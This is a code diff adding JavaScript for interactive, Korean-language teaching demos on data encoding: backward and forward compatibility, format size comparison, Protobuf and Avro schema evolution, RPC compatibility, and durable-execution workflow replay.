+  if(s.anim==='protoevo'&&!animState.protoevo)setupProtoEvo();
+  if(s.anim==='avroresolve'&&!animState.avroresolve)setupAvroResolve();
+  if(s.anim==='rpccompat'&&!animState.rpccompat)setupRpcCompat();
+  if(s.anim==='workflow'&&!animState.workflow)setupWorkflow();
+}
+
+/* ---- 1. Compatibility simulator ---- */
+function setupCompat(){
+  animState.compat=true;
+  const dataEl=document.getElementById('cData');
+  const resultEl=document.getElementById('cResult');
+  const msgEl=document.getElementById('cMsg');
+
+  function reset(){
+    dataEl.innerHTML='{ 데이터 없음 }';
+    resultEl.innerHTML='시나리오를 선택하세요';
+    msgEl.innerHTML='위 버튼으로 시나리오를 시작하세요.';
+  }
+
+  // 하위 호환: 새 코드가 옛 데이터를 읽기
+  document.getElementById('cBwd').onclick=()=>{
+    dataEl.innerHTML=
+      '{<br>'+
+      '&nbsp;&nbsp;name: "Martin",<br>'+
+      '&nbsp;&nbsp;age: 30<br>'+
+      '}<br>'+
+      '<span style="color:#8a7f6a">// 옛 코드가 쓴 데이터 (photoURL 필드 없음)</span>';
+    resultEl.innerHTML=
+      '<span class="new">name: "Martin"</span><br>'+
+      '<span class="new">age: 30</span><br>'+
+      '<span class="new">photoURL: null</span> <span style="color:#8a7f6a">// 기본값</span><br>'+
+      '<span style="color:#8a7f6a">// 새 코드의 Person 객체</span>';
+    msgEl.innerHTML='<b style="color:var(--accent2)">✓ 하위 호환성</b> · 새 코드는 옛 형식을 알고 있어 누락된 photoURL은 기본값(null)으로 채움. 보통 쉬움.';
+  };
+
+  // 상위 호환: 옛 코드가 새 데이터를 읽기
+  document.getElementById('cFwd').onclick=()=>{
+    dataEl.innerHTML=
+      '{<br>'+
+      '&nbsp;&nbsp;name: "Martin",<br>'+
+      '&nbsp;&nbsp;age: 30,<br>'+
+      '&nbsp;&nbsp;<span class="new">photoURL: "http://..."</span><br>'+
+      '}<br>'+
+      '<span style="color:#8a7f6a">// 새 코드가 쓴 데이터 (photoURL 추가됨)</span>';
+    resultEl.innerHTML=
+      'name: "Martin"<br>'+
+      'age: 30<br>'+
+      '<span class="preserved">photoURL: 알 수 없음 → 보존</span><br>'+
+      '<span style="color:#8a7f6a">// 옛 코드는 photoURL을 모르지만</span><br>'+
+      '<span style="color:#8a7f6a">// 좋은 형식이라면 그대로 보존</span>';
+    msgEl.innerHTML='<b style="color:var(--gold)">⚠ 상위 호환성</b> · 옛 코드는 미래의 photoURL 필드를 모름. <b>최소한 무시</b>하고, 가능하면 보존해야 함.';
+  };
+
+  // 함정: 옛 코드의 read-modify-write
+  document.getElementById('cTrap').onclick=()=>{
+    dataEl.innerHTML=
+      '<span style="color:#8a7f6a">// 1) 새 코드가 저장</span><br>'+
+      '{ name: "Martin", age: 30, <span class="new">photoURL: "http://..."</span> }<br><br>'+
+      '<span style="color:#8a7f6a">// 2) 옛 코드가 읽어서 객체로 만듦<br>'+
+      '//    (photoURL 필드가 없는 클래스로 디코딩)</span><br>'+
+      '<span style="color:#8a7f6a">// 3) 옛 코드가 age=31로 수정 후 다시 씀</span><br>'+
+      '{ name: "Martin", age: 31, <span class="lost">photoURL: ???</span> }';
+    resultEl.innerHTML=
+      'name: "Martin"<br>'+
+      'age: 31 <span style="color:#a9c98a">// 수정됨</span><br>'+
+      '<span class="lost">photoURL: 사라짐!</span><br>'+
+      '<span style="color:#8a7f6a">// 옛 코드의 객체엔 photoURL 슬롯이</span><br>'+
+      '<span style="color:#8a7f6a">// 없어 디코딩 시 데이터 손실 발생</span>';
+    msgEl.innerHTML='<b style="color:var(--accent)">⚠ 데이터 손실 함정</b> · 옛 코드가 모르는 새 필드를 보존하지 못한 채 다시 쓰면, <b>photoURL이 증발</b>함. 이게 인코딩 형식의 핵심 평가 기준.';
+  };
+
+  document.getElementById('cReset').onclick=reset;
+  reset();
+}
+
+/* ---- 2. Size bar comparison ---- */
+function setupSizeBar(){
+  animState.sizebar=true;
+  const container=document.getElementById('sizeBars');
+  const st=document.getElementById('szStatus');
+  const data=[
+    {cls:'json', label:'Text JSON', bytes:81, max:100, color:'#8a7f6a'},
+    {cls:'mp',   label:'MessagePack', bytes:66, max:100, color:'#b8860b'},
+    {cls:'pb',   label:'Protocol Buffers', bytes:33, max:100, color:'#1b6b6b'},
+    {cls:'av',   label:'Avro', bytes:32, max:100, color:'#c0392b'},
+  ];
+  function render(filled){
+    container.innerHTML=data.map((d,i)=>{
+      const w=filled?(d.bytes/d.max*100):0;
+      return `<div class="size-bar ${d.cls}">
+        <div class="bar-label">${d.label}</div>
+        <div class="bar-track">
+          <div class="bar-fill" style="width:${w}%">${filled?d.bytes+' bytes':''}</div>
+        </div>
+      </div>`;
+    }).join('');
+  }
+  document.getElementById('szPlay').onclick=()=>{
+    render(true);
+    st.textContent='✓ Avro 32B / Protobuf 33B — 텍스트 JSON보다 60% 이상 줄어듦';
+  };
+  document.getElementById('szReset').onclick=()=>{
+    render(false);
+    st.textContent='시작하려면 버튼을 누르세요';
+  };
+  render(false);
+}
+
+/* ---- 3. Protobuf schema evolution ---- */
+function setupProtoEvo(){
+  animState.protoevo=true;
+  const oldEl=document.getElementById('oldSchema');
+  const newEl=document.getElementById('newSchema');
+  const msgEl=document.getElementById('peMsg');
+
+  const initialFields=[
+    {tag:1, name:'user_name', type:'string'},
+    {tag:2, name:'favorite_number', type:'int64'},
+    {tag:3, name:'interests', type:'repeated string'},
+  ];
+  let newFields=JSON.parse(JSON.stringify(initialFields));
+
+  function format(fields, oldFields){
+    let h='<span style="color:#f0c674">message</span> Person {<br>';
+    fields.forEach(f=>{
+      let cls='keep';
+      let suffix='';
+      if(f._added) cls='add', suffix=' <span style="color:#a9c98a">// NEW</span>';
+      if(f._removed) cls='del';
+      if(f._renamed) cls='add', suffix=' <span style="color:#a9c98a">// renamed</span>';
+      if(f._reuseTag) cls='del', suffix=' <span style="color:#e0907a">// ⚠ 태그 재사용!</span>';
+      h+=`&nbsp;&nbsp;<span class="${cls}">${f.type} ${f.name} = ${f.tag};</span>${suffix}<br>`;
+    });
+    h+='}';
+    return h;
+  }
+  function render(){
+    oldEl.innerHTML=format(initialFields);
+    newEl.innerHTML=format(newFields);
+  }
+  function reset(){
+    newFields=JSON.parse(JSON.stringify(initialFields));
+    render();
+    msgEl.innerHTML='버튼을 눌러 스키마를 진화시켜 보세요. 각 변경이 양방향 호환에 어떤 영향을 주는지 표시됨.';
+  }
+
+  document.getElementById('peAddSafe').onclick=()=>{
+    // 이미 추가되어 있으면 아무것도 안함
+    if(newFields.some(f=>f.tag===4)){
+      msgEl.innerHTML='이미 태그 4 필드가 존재함. 리셋 후 다시 시도하세요.';
+      return;
+    }
+    newFields.push({tag:4, name:'email', type:'string', _added:true});
+    render();
+    msgEl.innerHTML='<b style="color:var(--accent2)">✓ 안전</b> · 태그 4로 새 필드 추가. <b>옛 코드</b>는 인식 못 해 무시(상위 호환 ✓). <b>새 코드</b>는 옛 데이터를 읽으면 email 필드를 기본값으로 채움(하위 호환 ✓).';
+  };
+
+  document.getElementById('peRename').onclick=()=>{
+    const f=newFields.find(x=>x.name==='user_name');
+    if(f && !f._renamed){
+      f.name='username';
+      f._renamed=true;
+      render();
+      msgEl.innerHTML='<b style="color:var(--accent2)">✓ 안전</b> · 필드 이름을 user_name → username으로 변경. <b>인코딩 데이터는 필드 이름을 참조하지 않으므로</b> 호환성에 영향 없음. (태그 번호 1만 의미가 있음)';
+    } else {
+      msgEl.innerHTML='이미 이름을 변경했음. 리셋 후 다시 시도하세요.';
+    }
+  };
+
+  document.getElementById('peRemove').onclick=()=>{
+    const idx=newFields.findIndex(x=>x.tag===2);
+    if(idx>=0 && !newFields[idx]._removed){
+      newFields[idx]._removed=true;
+      render();
+      msgEl.innerHTML='<b style="color:var(--gold)">⚠ 조심</b> · 태그 2(favorite_number) 제거. <b>이 태그 번호는 영원히 봉인</b>해야 함 — 다시는 다른 의미로 재사용하면 안 됨. 옛 데이터에는 이 필드가 남아 있을 수 있음.';
+    } else {
+      msgEl.innerHTML='이미 제거되었음.';
+    }
+  };
+
+  document.getElementById('peReuseTag').onclick=()=>{
+    // 태그 2를 다른 의미로 재사용 시도
+    const idx=newFields.findIndex(x=>x.tag===2);
+    if(idx>=0){
+      newFields[idx]={tag:2, name:'phone', type:'string', _reuseTag:true};
+      render();
+      msgEl.innerHTML='<b style="color:var(--accent)">⚠⚠ 치명적 오류!</b> · 태그 2를 phone 필드로 재사용. <b>옛 데이터의 favorite_number(int64)가 phone(string)으로 잘못 해석</b>되어 데이터가 깨짐. <b>제거한 태그는 절대 재사용 금지.</b>';
+    }
+  };
+
+  document.getElementById('peReset').onclick=reset;
+  reset();
+}
+
+/* ---- 4. Avro Reader/Writer schema resolution ---- */
+function setupAvroResolve(){
+  animState.avroresolve=true;
+  const wEl=document.getElementById('avW');
+  const rEl=document.getElementById('avR');
+  const stEl=document.getElementById('avStatus');
+  let step=0;
+
+  // writer schema has: userName, favoriteNumber (writer-only field), interests
+  // reader schema has: interests (different order), userName, email (reader-only with default)
+  const writerFields=[
+    {name:'userName', type:'string'},
+    {name:'favoriteNumber', type:'long'},
+    {name:'interests', type:'array'},
+  ];
+  const readerFields=[
+    {name:'interests', type:'array'},
+    {name:'userName', type:'string'},
+    {name:'email', type:'string', default:'"none"'},
+  ];
+
+  function render(){
+    // step 0: 그냥 양쪽 다 표시
+    // step 1: 순서 무관 — 이름으로 매칭 → userName, interests 매칭
+    // step 2: writer-only — favoriteNumber는 reader가 모름 → 무시
+    // step 3: reader-only — email은 writer에 없음 → default
+
+    const wState=writerFields.map(f=>{
+      let cls='';
+      if(step>=1 && (f.name==='userName' || f.name==='interests')) cls='matched';
+      if(step>=2 && f.name==='favoriteNumber') cls='skipped';
+      return {f,cls};
+    });
+    const rState=readerFields.map(f=>{
+      let cls='';
+      if(step>=1 && (f.name==='userName' || f.name==='interests')) cls='matched';
+      if(step>=3 && f.name==='email') cls='defaulted';
+      return {f,cls};
+    });
+
+    wEl.innerHTML=wState.map(s=>{
+      const d=s.f.default?` = ${s.f.default}`:'';
+      return `<div class="avro-row ${s.cls}">${s.f.type} ${s.f.name}${d}</div>`;
+    }).join('');
+    rEl.innerHTML=rState.map(s=>{
+      const d=s.f.default?` = ${s.f.default}`:'';
+      return `<div class="avro-row ${s.cls}">${s.f.type} ${s.f.name}${d}</div>`;
+    }).join('');
+  }
+  const statuses=[
+    "'다음 규칙 시연'을 눌러 단계별로 진행하세요",
+    '규칙 ① · 순서가 달라도 OK — userName과 interests는 이름으로 매칭됨',
+    '규칙 ② · writer만 있는 favoriteNumber — reader가 모르니 무시(skipped)',
+    '규칙 ③ · reader만 있는 email — reader 스키마의 기본값 "none"으로 채움',
+    '✓ 해석 완료 — 모든 필드가 이름 기반 매칭 / 무시 / 기본값으로 처리됨',
+  ];
+
+  document.getElementById('avNext').onclick=()=>{
+    step=Math.min(4,step+1);
+    stEl.textContent=statuses[Math.min(step,4)];
+    render();
+  };
+  document.getElementById('avReset').onclick=()=>{
+    step=0;stEl.textContent=statuses[0];render();
+  };
+  render();
+}
+
+/* ---- 5. RPC compatibility direction ---- */
+function setupRpcCompat(){
+  animState.rpccompat=true;
+  const reqEl=document.getElementById('rpcReq');
+  const resEl=document.getElementById('rpcRes');
+  const stEl=document.getElementById('rpcStatus');
+
+  function reset(){
+    reqEl.classList.remove('live');
+    resEl.classList.remove('live');
+    reqEl.textContent='→ Request →';
+    resEl.textContent='← Response ←';
+    stEl.textContent='버튼을 눌러 시연하세요';
+  }
+
+  document.getElementById('rpcReqBtn').onclick=()=>{
+    reqEl.classList.add('live');
+    resEl.classList.remove('live');
+    reqEl.innerHTML='→ 옛 형식 요청 →';
+    stEl.innerHTML='<b style="color:var(--accent2)">하위 호환성 필요</b> · 옛 클라이언트(옛 형식) → 새 서버(새 코드). = 새 코드가 옛 데이터 읽기';
+  };
+  document.getElementById('rpcResBtn').onclick=()=>{
+    resEl.classList.add('live');
+    reqEl.classList.remove('live');
+    resEl.innerHTML='← 새 형식 응답 ←';
+    stEl.innerHTML='<b style="color:var(--gold)">상위 호환성 필요</b> · 새 서버(새 형식) → 옛 클라이언트(옛 코드). = 옛 코드가 새 데이터 읽기';
+  };
+  document.getElementById('rpcReset').onclick=reset;
+  reset();
+}
+
+/* ---- 6. Durable Execution workflow replay ---- */
+function setupWorkflow(){
+  animState.workflow=true;
+  const tasksEl=document.getElementById('wfTasks');
+  const stEl=document.getElementById('wfStatus');
+
+  const TASKS=['사기 탐지', '신용카드 출금', '은행 입금', '확인 이메일'];
+  // state per task: 'pending' | 'running' | 'done' | 'failed' | 'skipped'
+  let state=TASKS.map(()=>'pending');
+  let mode='normal'; // 'normal' or 'replay'
+
+  function render(){
+    tasksEl.innerHTML=TASKS.map((t,i)=>{
+      const cls=state[i]==='pending'?'':state[i];
+      const arrow=i<TASKS.length-1?'<span class="wf-arrow">→</span>':'';
+      return `<div class="wf-task ${cls}">${i+1}. ${t}</div>${arrow}`;
+    }).join('');
+  }
+  function reset(){
+    state=TASKS.map(()=>'pending');
+    mode='normal';
+    stEl.textContent="시작하려면 '다음 단계'를 누르세요";
+    render();
+  }
+
+  document.getElementById('wfNext').onclick=()=>{
+    if(mode==='replay'){
+      stEl.textContent='재실행 모드임. 재실행 버튼을 사용하세요.';
+      return;
+    }
+    // 다음 pending 또는 running → done, running으로
+    let runningIdx=state.indexOf('running');
+    if(runningIdx>=0){
+      state[runningIdx]='done';
+      stEl.textContent=`태스크 ${runningIdx+1} "${TASKS[runningIdx]}" 완료 → WAL에 영수증 기록`;
+    }
+    let nextIdx=state.indexOf('pending');
+    if(nextIdx>=0){
+      state[nextIdx]='running';
+      stEl.textContent+=` · 태스크 ${nextIdx+1} "${TASKS[nextIdx]}" 실행 중...`;
+    } else if(state.indexOf('running')<0 && !state.includes('failed')){
+      stEl.innerHTML='<b style="color:var(--accent2)">✓ 모든 태스크 완료 — 정확히 한 번 처리됨</b>';
+    }
+    render();
+  };
+
+  document.getElementById('wfFail').onclick=()=>{
+    // 처음 2개는 done, 3번째에서 실패
+    state=['done','done','failed','pending'];
+    mode='normal';
+    stEl.innerHTML='<b style="color:var(--accent)">⚠ 태스크 3 "은행 입금" 실패!</b> 신용카드는 청구됐지만 은행 입금이 안 됨 → 재실행이 필요. WAL에는 태스크 1, 2의 영수증이 있음.';
+    render();
+  };
+
+  document.getElementById('wfReplay').onclick=()=>{
+    // 영수증 있는 단계 skip, 실패한 단계부터 다시 시도
+    state=['skipped','skipped','running','pending'];
+    mode='replay';
+    stEl.innerHTML='<b style="color:var(--accent2)">↻ 재실행 시작</b> · 태스크 1, 2는 WAL 영수증이 있으므로 <b>건너뜀</b>(skip). 호출한 척하면서 이전 결과를 반환. 태스크 3부터 다시 실행 시도.';
+    render();
+    // 1.2초 후 자동으로 진행
+    setTimeout(()=>{
+      state=['skipped','skipped','done','running'];
+      stEl.innerHTML='<b style="color:var(--accent2)">↻ 재실행 진행 중</b> · 태스크 3 "은행 입금" 성공 → 영수증 기록. 태스크 4 실행 중...';
+      render();
+    }, 1200);
+    setTimeout(()=>{
+      state=['skipped','skipped','done','done'];
+      stEl.innerHTML='<b style="color:var(--accent2)">✓ 재실행 완료</b> · 정확히 한 번 처리됨. 신용카드 출금은 두 번 발생하지 않음 (영수증 덕분).';
+      render();
+    }, 2400);
+  };
+
+  document.getElementById('wfReset').onclick=reset;
+  reset();
+}
+
+show(0);
+</script>
+</body>
+</html>
